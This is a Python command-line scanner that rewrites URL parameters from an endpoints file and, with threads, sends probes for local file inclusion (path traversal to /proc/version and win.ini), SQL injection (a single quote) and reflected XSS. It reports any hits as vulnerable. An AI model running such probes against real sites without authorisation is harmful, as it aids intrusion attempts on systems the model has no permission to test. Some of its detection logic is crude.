import concurrent.futures
import sys
import argparse
import requests
import re
from colorama import Fore, Style
import time

# arguments
parser_arg_menu = argparse.ArgumentParser(prog='tool', formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=40)
)
parser_arg_menu.add_argument(
"-e" , "--endpoints" , help="File contain subdomains Ex: endpoints.txt",
metavar=""
)

parser_arg_menu.add_argument(
"-o", "--output" ,help="Output results in file", 
metavar=""
)

arg_menu = parser_arg_menu.parse_args()
endpoints_file 	= arg_menu.endpoints
output_file = arg_menu.output



# Reading givien input file and add =FUZZ then output it.
def readFile(filePath, output):
    with open(filePath, 'r') as file:
        for line in file:
            if '=' in line:
                patern = re.sub(r'=[a-zA-Z0-9%\-_.+:/]{0,}', '=FUZZ', line)
                print(patern, file=open(output, "a"))
            else:
                pass


# Sorting and delete duplicated lines
def sorting(output):
    with open(output) as resultx:
            uniqlines = set(resultx.readlines())
            delemptylines = filter(lambda x: not x.isspace(), uniqlines)
            with open(output, 'w') as final_file:
                final_file.writelines(set(delemptylines))

# Threading
def Thread(vuln):
    myList = open(output_file).readlines()
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        for url in myList:
            futures.append(executor.submit(vuln, url))
        for future in concurrent.futures.as_completed(futures):
            #print(future.result())
            pass

def testSQLI(url, timeout=10):
    r1 = requests.get(url, timeout)
    re1 = (len(r1.text))
    x = url.replace("FUZZ", "'")
    r2 = requests.get(x)
    re2 = (len(r2.text))

    if re2 < re1:
        print(Fore.GREEN + '[*] Vulnerable to SQLI => ' + Fore.YELLOW +url, end='')
    else:
        pass


def testXSS(url, timeout=10):
    x = url.replace('FUZZ', ">bat\"man/<'")
    r = requests.get(x, timeout)
    if ">bat\"man/<'" in r.text:
        print(Fore.GREEN + '[*] Vulnerable to XSS => ' + Fore.YELLOW +url, end='')
    else:
        pass

def testLFI(url, timeout=10):
    linux = url.replace('FUZZ', '../../../../../../../../../../../../../../../../../../../proc/version')
    linuxR = requests.get(linux, timeout)
    if "gcc" in linuxR.text:
        print(Fore.GREEN + '[*] Vulnerable to LFI (Linux) => ' + Fore.YELLOW +url, end='')
    else:
        pass
    x = url
    windows = x.replace('FUZZ', "C:/Windows/win.ini")
    try:
        windowsR = requests.get(windows)
        if "[Mail]" in windowsR.text:
            print(Fore.GREEN + '[*] Vulnerable to LFI (Windows) => ' + Fore.YELLOW +url, end='')
        
    except Exception as error:
        print(error)

if __name__=='__main__':
    try:
        if arg_menu.endpoints:
            t1 = time.perf_counter()
            
            print(Style.BRIGHT + Fore.RED + '''
	    ___  ______  _____
	   /   |/_  __/ /__  /
	  / /| | / /      / / 
	 / ___ |/ /      / /  
	/_/  |_/_/_____ /_/   
	         /_____/
''')
            print(Fore.YELLOW + '''              CODED BY : A.Tarek
''')

            #Running Functions
            readFile(endpoints_file, output_file)
            sorting(output_file)
            print(Fore.CYAN + "[#]Testing LFI[#]")
            Thread(testLFI)
            print(Fore.CYAN + "[#]Testing SQLI[#]")
            Thread(testSQLI)
            print(Fore.CYAN + "[#]Testing XSS[#]")
            Thread(testXSS)
            t2 = time.perf_counter() - t1
            print(f'Total time taken: {t2:0.2f} seconds')

        else:
            print(Fore.YELLOW + '[*] Usage: python3 script.py -e endpoints.txt -o output.txt')
    except:
        sys.exit()
